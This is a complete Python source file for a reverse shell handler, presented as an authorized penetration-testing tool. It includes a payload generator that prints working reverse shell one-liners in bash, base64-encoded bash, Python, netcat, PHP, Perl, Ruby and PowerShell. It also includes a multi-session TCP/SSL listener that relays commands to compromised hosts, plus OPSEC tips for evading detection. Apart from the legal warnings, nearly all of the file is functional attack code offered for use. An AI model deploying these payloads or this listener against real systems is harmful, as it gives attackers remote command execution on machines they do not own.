#!/usr/bin/env python3
"""
Reverse Shell Handler - Multi-Protocol Shell Listener
======================================================

A comprehensive reverse shell handler supporting multiple protocols
and encoding options for authorized penetration testing.

Author: Offensive Security Toolsmith
Version: 1.0.0
License: For authorized security testing only

WARNING: This tool is intended for authorized security assessments only.
Unauthorized access to computer systems is illegal.
"""

import argparse
import base64
import os
import select
import socket
import ssl
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from datetime import datetime
from enum import Enum


# =============================================================================
# Configuration and Constants
# =============================================================================

DEFAULT_PORT = 4444
DEFAULT_TIMEOUT = 300  # 5 minutes
RECV_SIZE = 4096


class ShellType(Enum):
    """Supported shell types."""
    RAW = "raw"
    TTY = "tty"
    HTTP = "http"


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class Session:
    """Represents an active shell session."""
    id: int
    socket: socket.socket
    address: Tuple[str, int]
    connected_at: datetime = field(default_factory=datetime.now)
    active: bool = True
    ssl_enabled: bool = False
    history: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "address": f"{self.address[0]}:{self.address[1]}",
            "connected_at": self.connected_at.isoformat(),
            "active": self.active,
            "ssl_enabled": self.ssl_enabled
        }


@dataclass
class HandlerConfig:
    """Configuration for shell handler."""
    host: str = "0.0.0.0"
    port: int = DEFAULT_PORT
    shell_type: ShellType = ShellType.RAW
    ssl_enabled: bool = False
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    timeout: int = DEFAULT_TIMEOUT
    multi_handler: bool = False
    verbose: bool = False
    plan_mode: bool = False


# =============================================================================
# Payload Generation
# =============================================================================

class PayloadGenerator:
    """
    Generate reverse shell payloads for various platforms and languages.

    Payloads are displayed for manual deployment - no automatic execution.
    """

    @staticmethod
    def bash(host: str, port: int) -> str:
        """Generate Bash reverse shell payload."""
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"

    @staticmethod
    def bash_base64(host: str, port: int) -> str:
        """Generate base64-encoded Bash payload."""
        payload = PayloadGenerator.bash(host, port)
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    @staticmethod
    def python(host: str, port: int) -> str:
        """Generate Python reverse shell payload."""
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''

    @staticmethod
    def netcat(host: str, port: int) -> str:
        """Generate Netcat reverse shell payload."""
        return f"nc -e /bin/sh {host} {port}"

    @staticmethod
    def netcat_no_e(host: str, port: int) -> str:
        """Generate Netcat reverse shell without -e flag."""
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"

    @staticmethod
    def php(host: str, port: int) -> str:
        """Generate PHP reverse shell payload."""
        return f'''php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' '''

    @staticmethod
    def perl(host: str, port: int) -> str:
        """Generate Perl reverse shell payload."""
        return f'''perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''

    @staticmethod
    def ruby(host: str, port: int) -> str:
        """Generate Ruby reverse shell payload."""
        return f'''ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''

    @staticmethod
    def powershell(host: str, port: int) -> str:
        """Generate PowerShell reverse shell payload."""
        return f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''

    @classmethod
    def get_all(cls, host: str, port: int) -> Dict[str, str]:
        """Get all payload types."""
        return {
            "bash": cls.bash(host, port),
            "bash_b64": cls.bash_base64(host, port),
            "python": cls.python(host, port),
            "netcat": cls.netcat(host, port),
            "netcat_no_e": cls.netcat_no_e(host, port),
            "php": cls.php(host, port),
            "perl": cls.perl(host, port),
            "ruby": cls.ruby(host, port),
            "powershell": cls.powershell(host, port),
        }


# =============================================================================
# Shell Handler Core
# =============================================================================

class ShellHandler:
    """
    Main shell handler engine.

    Listens for incoming connections and provides interactive shell access.
    """

    def __init__(self, config: HandlerConfig):
        self.config = config
        self.sessions: Dict[int, Session] = {}
        self._session_counter = 0
        self._server_socket: Optional[socket.socket] = None
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._current_session: Optional[Session] = None

    def _setup_socket(self) -> socket.socket:
        """Create and configure server socket."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)  # For periodic stop check

        if self.config.ssl_enabled:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            if self.config.ssl_cert and self.config.ssl_key:
                context.load_cert_chain(self.config.ssl_cert, self.config.ssl_key)
            else:
                # Generate self-signed cert (for demo - real use should have certs)
                pass
            sock = context.wrap_socket(sock, server_side=True)

        return sock

    def _accept_connection(self) -> Optional[Session]:
        """Accept incoming connection."""
        try:
            client_socket, address = self._server_socket.accept()
            client_socket.settimeout(self.config.timeout)

            with self._lock:
                self._session_counter += 1
                session = Session(
                    id=self._session_counter,
                    socket=client_socket,
                    address=address,
                    ssl_enabled=self.config.ssl_enabled
                )
                self.sessions[session.id] = session

            return session

        except socket.timeout:
            return None
        except Exception as e:
            if self.config.verbose:
                print(f"[!] Accept error: {e}")
            return None

    def _interact(self, session: Session) -> None:
        """
        Interactive shell session.

        Handles bidirectional communication with the connected client.
        """
        print(f"\n[*] Interacting with session {session.id} ({session.address[0]}:{session.address[1]})")
        print("[*] Type 'background' to return to handler, 'exit' to close session")
        print()

        try:
            while session.active and not self._stop_event.is_set():
                # Check for input from both sides
                readable = [session.socket, sys.stdin]

                try:
                    ready, _, _ = select.select(readable, [], [], 0.5)
                except (ValueError, OSError):
                    break

                for source in ready:
                    if source == session.socket:
                        # Data from remote
                        try:
                            data = session.socket.recv(RECV_SIZE)
                            if not data:
                                print("\n[!] Connection closed by remote")
                                session.active = False
                                break
                            sys.stdout.write(data.decode('utf-8', errors='ignore'))
                            sys.stdout.flush()
                        except socket.timeout:
                            continue
                        except Exception as e:
                            print(f"\n[!] Receive error: {e}")
                            session.active = False
                            break

                    elif source == sys.stdin:
                        # Input from operator
                        command = sys.stdin.readline()

                        if command.strip().lower() == 'background':
                            print("\n[*] Session backgrounded")
                            return

                        if command.strip().lower() == 'exit':
                            print("\n[*] Closing session")
                            session.active = False
                            break

                        try:
                            session.socket.send(command.encode())
                            session.history.append(command.strip())
                        except Exception as e:
                            print(f"\n[!] Send error: {e}")
                            session.active = False
                            break

        except KeyboardInterrupt:
            print("\n[*] Session interrupted")

        finally:
            if not session.active:
                self._close_session(session)

    def _close_session(self, session: Session) -> None:
        """Close a session."""
        session.active = False
        try:
            session.socket.close()
        except Exception:
            pass

        if session.id in self.sessions:
            del self.sessions[session.id]

        if self.config.verbose:
            print(f"[*] Session {session.id} closed")

    def start(self) -> None:
        """Start the shell handler."""
        try:
            self._server_socket = self._setup_socket()
            self._server_socket.bind((self.config.host, self.config.port))
            self._server_socket.listen(5)

            ssl_str = " (SSL)" if self.config.ssl_enabled else ""
            print(f"[*] Handler listening on {self.config.host}:{self.config.port}{ssl_str}")
            print("[*] Waiting for connection...")
            print("[*] Press Ctrl+C to stop handler")
            print()

            while not self._stop_event.is_set():
                session = self._accept_connection()

                if session:
                    print(f"\n[+] Connection from {session.address[0]}:{session.address[1]}")
                    print(f"[+] Session ID: {session.id}")

                    if self.config.multi_handler:
                        # Multi-handler mode - don't auto-interact
                        print("[*] Use 'sessions' to list, 'interact <id>' to connect")
                    else:
                        # Single handler - auto-interact
                        self._interact(session)

        except KeyboardInterrupt:
            print("\n[!] Handler interrupted")
        except Exception as e:
            print(f"[!] Handler error: {e}")
        finally:
            self.stop()

    def stop(self) -> None:
        """Stop the handler and close all sessions."""
        self._stop_event.set()

        # Close all sessions
        for session in list(self.sessions.values()):
            self._close_session(session)

        # Close server socket
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

        print("[*] Handler stopped")

    def list_sessions(self) -> List[Session]:
        """Return list of active sessions."""
        return [s for s in self.sessions.values() if s.active]

    def interact_session(self, session_id: int) -> bool:
        """Interact with a specific session."""
        session = self.sessions.get(session_id)
        if session and session.active:
            self._interact(session)
            return True
        return False


# =============================================================================
# Planning Mode
# =============================================================================

def print_plan(config: HandlerConfig) -> None:
    """Display execution plan without performing any actions."""
    print("""
[PLAN MODE] Tool: reverse-shell-handler
================================================================================
""")

    print("HANDLER CONFIGURATION")
    print("-" * 40)
    print(f"  Listen Address:  {config.host}")
    print(f"  Listen Port:     {config.port}")
    print(f"  Shell Type:      {config.shell_type.value}")
    print(f"  SSL Enabled:     {config.ssl_enabled}")
    print(f"  Multi-Handler:   {config.multi_handler}")
    print(f"  Timeout:         {config.timeout}s")
    print()

    print("ACTIONS TO BE PERFORMED")
    print("-" * 40)
    print(f"  1. Create TCP socket and bind to {config.host}:{config.port}")
    if config.ssl_enabled:
        print("  2. Wrap socket with SSL/TLS")
    print("  3. Listen for incoming connections")
    print("  4. Accept connection and create session")
    print("  5. Provide interactive shell access")
    print()

    print("AVAILABLE PAYLOADS")
    print("-" * 40)
    print("  Execute with: --payloads flag")
    print("  - bash: Standard bash reverse shell")
    print("  - python: Python one-liner")
    print("  - netcat: Netcat with -e flag")
    print("  - php: PHP reverse shell")
    print("  - powershell: PowerShell one-liner")
    print()

    print("RISK ASSESSMENT")
    print("-" * 40)
    print("  Risk Level: HIGH")
    print("    - Opens listening port on system")
    print("    - Receives arbitrary code execution")
    print("    - All traffic is logged/visible")
    print()

    print("DETECTION VECTORS")
    print("-" * 40)
    print("  - Network monitoring will detect listener")
    print("  - Firewall may block incoming connections")
    print("  - Process list shows Python listener")
    print("  - Shell commands executed on target logged")
    print()

    print("OPSEC CONSIDERATIONS")
    print("-" * 40)
    print("  - Consider using SSL for encrypted traffic")
    print("  - Use non-standard ports if possible")
    print("  - Session data kept in-memory only")
    print()

    print("=" * 80)
    print("No actions will be taken. Remove --plan flag to execute.")
    print("=" * 80)


def print_payloads(host: str, port: int) -> None:
    """Print available payloads."""
    payloads = PayloadGenerator.get_all(host, port)

    print(f"""
[*] Reverse Shell Payloads for {host}:{port}
================================================================================
""")

    for name, payload in payloads.items():
        print(f"[{name.upper()}]")
        print("-" * 60)
        print(payload)
        print()


# =============================================================================
# Documentation Hooks
# =============================================================================

def get_documentation() -> Dict[str, Any]:
    """Return structured documentation for integration."""
    return {
        "name": "reverse-shell-handler",
        "version": "1.0.0",
        "category": "c2",
        "description": "Multi-protocol reverse shell listener",
        "author": "Offensive Security Toolsmith",
        "license": "Authorized security testing only",
        "features": [
            "TCP reverse shell handling",
            "SSL/TLS support",
            "Multi-session management",
            "Payload generation",
            "Session backgrounding",
            "In-memory session storage"
        ],
        "arguments": {
            "--host": {
                "type": "string",
                "default": "0.0.0.0",
                "description": "Listen address"
            },
            "--port": {
                "type": "int",
                "default": 4444,
                "description": "Listen port"
            },
            "--ssl": {
                "type": "bool",
                "default": False,
                "description": "Enable SSL/TLS"
            },
            "--payloads": {
                "type": "bool",
                "default": False,
                "description": "Show payload options"
            },
            "--plan": {
                "type": "bool",
                "default": False,
                "description": "Show execution plan"
            }
        }
    }


# =============================================================================
# CLI Interface
# =============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Reverse Shell Handler - Multi-Protocol Shell Listener",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --plan
  %(prog)s -l 4444
  %(prog)s -l 443 --ssl
  %(prog)s --payloads -H 10.0.0.1 -l 4444

WARNING: Use only for authorized security testing.
        """
    )

    parser.add_argument(
        "-H", "--host",
        default="0.0.0.0",
        help="Listen address (default: 0.0.0.0)"
    )

    parser.add_argument(
        "-l", "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Listen port (default: {DEFAULT_PORT})"
    )

    parser.add_argument(
        "-s", "--ssl",
        action="store_true",
        help="Enable SSL/TLS encryption"
    )

    parser.add_argument(
        "--ssl-cert",
        help="SSL certificate file"
    )

    parser.add_argument(
        "--ssl-key",
        help="SSL private key file"
    )

    parser.add_argument(
        "-m", "--multi",
        action="store_true",
        help="Multi-handler mode (manage multiple sessions)"
    )

    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Session timeout in seconds (default: {DEFAULT_TIMEOUT})"
    )

    parser.add_argument(
        "--payloads",
        action="store_true",
        help="Show reverse shell payloads"
    )

    parser.add_argument(
        "-p", "--plan",
        action="store_true",
        help="Show execution plan without starting handler"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    return parser.parse_args()


def main() -> int:
    """Main entry point."""
    args = parse_arguments()

    # Build configuration
    config = HandlerConfig(
        host=args.host,
        port=args.port,
        ssl_enabled=args.ssl,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        timeout=args.timeout,
        multi_handler=args.multi,
        verbose=args.verbose,
        plan_mode=args.plan
    )

    # Show payloads
    if args.payloads:
        # Determine callback host
        callback_host = args.host if args.host != "0.0.0.0" else "YOUR_IP"
        print_payloads(callback_host, args.port)
        return 0

    # Planning mode
    if config.plan_mode:
        print_plan(config)
        return 0

    # Start handler
    print("""
================================================================================
  REVERSE SHELL HANDLER
================================================================================
  WARNING: This tool is for AUTHORIZED security testing only.
  Unauthorized access to computer systems is ILLEGAL.
================================================================================
""")

    handler = ShellHandler(config)

    try:
        handler.start()
        return 0
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
